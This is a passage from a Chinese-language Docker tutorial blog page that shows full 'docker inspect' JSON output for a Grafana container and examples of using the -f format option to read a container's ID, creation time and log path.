class="hljs-selector-attr">[/]</span><br>┌──(root㉿<span class="hljs-number">61804</span>e0083af)-<span class="hljs-selector-attr">[/]</span><br></code></pre></td></tr></table></figure><h2 id="查看容器元数据"><a href="#查看容器元数据" class="headerlink" title="查看容器元数据"></a>查看容器元数据</h2><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h3 id="docker-inspect-1"><a href="#docker-inspect-1" class="headerlink" title="docker inspect"></a>docker inspect</h3><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h4><p>查看容器的基础数据</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># docker inspect 4b0e2ed242e0</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.271281387Z&quot;</span>,<br>        <span class="hljs-string">&quot;Path&quot;</span>: <span class="hljs-string">&quot;/run.sh&quot;</span>,<br>        <span class="hljs-string">&quot;Args&quot;</span>: [],<br>        <span class="hljs-string">&quot;State&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Status&quot;</span>: <span class="hljs-string">&quot;running&quot;</span>,<br>            <span class="hljs-string">&quot;Running&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;Paused&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Restarting&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OOMKilled&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Dead&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Pid&quot;</span>: <span class="hljs-number">1272</span>,<br>            <span class="hljs-string">&quot;ExitCode&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Error&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;StartedAt&quot;</span>: <span class="hljs-string">&quot;2022-09-16T01:30:49.547993902Z&quot;</span>,<br>            <span class="hljs-string">&quot;FinishedAt&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:aeeaa96eea830b988643e495b3978bff65dbdb997cc938ff5a4185a6bf3d7839&quot;</span>,<br>        <span class="hljs-string">&quot;ResolvConfPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/resolv.conf&quot;</span>,<br>        <span class="hljs-string">&quot;HostnamePath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hostname&quot;</span>,<br>        <span class="hljs-string">&quot;HostsPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/hosts&quot;</span>,<br>        <span class="hljs-string">&quot;LogPath&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/containers/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1/4b0e2ed242e0e9be6f1834263c786c89bbfc5e4a8c939fe39a9f4009ad29aeb1-json.log&quot;</span>,<br>        <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;/amazing_brahmagupta&quot;</span>,<br>        <span class="hljs-string">&quot;RestartCount&quot;</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-string">&quot;Driver&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>        <span class="hljs-string">&quot;Platform&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;MountLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ProcessLabel&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;AppArmorProfile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;ExecIDs&quot;</span>: <span class="hljs-literal">null</span>,<br>        <span class="hljs-string">&quot;HostConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Binds&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;ContainerIDFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LogConfig&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;json-file&quot;</span>,<br>                <span class="hljs-string">&quot;Config&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;NetworkMode&quot;</span>: <span class="hljs-string">&quot;default&quot;</span>,<br>            <span class="hljs-string">&quot;PortBindings&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;RestartPolicy&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;no&quot;</span>,<br>                <span class="hljs-string">&quot;MaximumRetryCount&quot;</span>: <span class="hljs-number">0</span><br>            &#125;,<br>            <span class="hljs-string">&quot;AutoRemove&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;VolumeDriver&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;VolumesFrom&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapDrop&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CgroupnsMode&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,<br>            <span class="hljs-string">&quot;Dns&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsOptions&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsSearch&quot;</span>: [],<br>            <span class="hljs-string">&quot;ExtraHosts&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;GroupAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;IpcMode&quot;</span>: <span class="hljs-string">&quot;private&quot;</span>,<br>            <span class="hljs-string">&quot;Cgroup&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomScoreAdj&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;PidMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Privileged&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PublishAllPorts&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ReadonlyRootfs&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;SecurityOpt&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;UTSMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;UsernsMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;ShmSize&quot;</span>: <span class="hljs-number">67108864</span>,<br>            <span class="hljs-string">&quot;Runtime&quot;</span>: <span class="hljs-string">&quot;runc&quot;</span>,<br>            <span class="hljs-string">&quot;ConsoleSize&quot;</span>: [<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-number">0</span><br>            ],<br>            <span class="hljs-string">&quot;Isolation&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpuShares&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Memory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;NanoCpus&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CgroupParent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;BlkioWeight&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;BlkioWeightDevice&quot;</span>: [],<br>            <span class="hljs-string">&quot;BlkioDeviceReadBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceReadIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuPeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuQuota&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimePeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimeRuntime&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpusetCpus&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpusetMems&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Devices&quot;</span>: [],<br>            <span class="hljs-string">&quot;DeviceCgroupRules&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;DeviceRequests&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;KernelMemory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;KernelMemoryTCP&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemoryReservation&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwap&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwappiness&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomKillDisable&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PidsLimit&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Ulimits&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuCount&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuPercent&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumIOps&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumBandwidth&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MaskedPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/asound&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/acpi&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/kcore&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/keys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/latency_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_list&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sched_debug&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/scsi&quot;</span>,<br>                <span class="hljs-string">&quot;/sys/firmware&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;ReadonlyPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/bus&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/fs&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/irq&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sysrq-trigger&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885-init/diff:/var/lib/docker/overlay2/633c4f694e05024bd76ad9fa14e1c6e91eafa6fc167d32d65323885a9716bc35/diff:/var/lib/docker/overlay2/3ecd937d9ada1a8fca42695112f838d4e6eecad76e4da399deacb18ef3649f82/diff:/var/lib/docker/overlay2/034018bf0da3afd6cf8bea09c68058ed00aef54e0874542ab6b0cd0b5a2f5b02/diff:/var/lib/docker/overlay2/6a03f6c5a8ecfae171548b33f90b727a03afd182a426885717725fbd33e1e336/diff:/var/lib/docker/overlay2/e0ab3c204ba426a01ca2074f17047430c05eecc9d07a1e950e1bc0a49bb46181/diff:/var/lib/docker/overlay2/2f13d908a74a801add00f7fff9820ccfb297beac35a2d91ea05f812e2de3faf2/diff:/var/lib/docker/overlay2/5342538fe3dcd1ce2077dc5ac82efaed68d7fa18d7d58e2c41129f1f0c3a0b3f/diff:/var/lib/docker/overlay2/40c7b37364a365de1537dd0a8fbf60f9fc1484feb520fea5a45e396dcbb4e121/diff:/var/lib/docker/overlay2/a02e590a00667b827a1e3c789b75c3bb846586593bf2fc8015546a8351f77443/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Mounts&quot;</span>: [],<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;472&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_CONFIG=/etc/grafana/grafana.ini&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_DATA=/var/lib/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_HOME=/usr/share/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_LOGS=/var/log/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PLUGINS=/var/lib/grafana/plugins&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PROVISIONING=/etc/grafana/provisioning&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;aeeaa96eea83&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;/usr/share/grafana&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/run.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;&#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;NetworkSettings&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Bridge&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;SandboxID&quot;</span>: <span class="hljs-string">&quot;d5029e992abf128054cd8dcb811ef7fcddde6c94578e84b3ad41b309eeea0301&quot;</span>,<br>            <span class="hljs-string">&quot;HairpinMode&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Ports&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: <span class="hljs-literal">null</span><br>            &#125;,<br>            <span class="hljs-string">&quot;SandboxKey&quot;</span>: <span class="hljs-string">&quot;/var/run/docker/netns/d5029e992abf&quot;</span>,<br>            <span class="hljs-string">&quot;SecondaryIPAddresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;SecondaryIPv6Addresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>            <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>            <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>            <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>            <span class="hljs-string">&quot;Networks&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;bridge&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;IPAMConfig&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Aliases&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;NetworkID&quot;</span>: <span class="hljs-string">&quot;3934b22c38426e6823be8668550b7d3992929a89bd449089673db6dc3dbbef26&quot;</span>,<br>                    <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>                    <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>                    <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>                    <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>                    <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>                    <span class="hljs-string">&quot;DriverOpts&quot;</span>: <span class="hljs-literal">null</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h4 id="OPTIONS-9"><a href="#OPTIONS-9" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-2"><a href="#f-2" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-10"><a href="#实例-10" class="headerlink" title="实例"></a>实例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><h5 id="查看容器ID"><a href="#查看容器ID" class="headerlink" title="查看容器ID"></a>查看容器ID</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">docker inspect <span class="hljs-punctuation">-</span>f<span class="hljs-punctuation">=</span>&#x27;&#123;&#123;.Id&#125;&#x27; Name<span class="hljs-string">|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Id</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f</span><br></code></pre></td></tr></table></figure><h5 id="查看容器创建具体时间"><a href="#查看容器创建具体时间" class="headerlink" title="查看容器创建具体时间"></a>查看容器创建具体时间</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">2022-12-08T04:42:46.58388013Z</span><br></code></pre></td></tr></table></figure><h5 id="查看容器日志路径"><a href="#查看容器日志路径" class="headerlink" title="查看容器日志路径"></a>查看容器日志路径</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.LogPath</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">➜  /tmp docker <span class="hljs-keyword">inspect</span> -f <span class="hljs-string">&#x27;&#123;&#123;.LogPath&#125;&#125;&#x27;</span> <span class="hljs-number">61804</span>e0083af<br><span 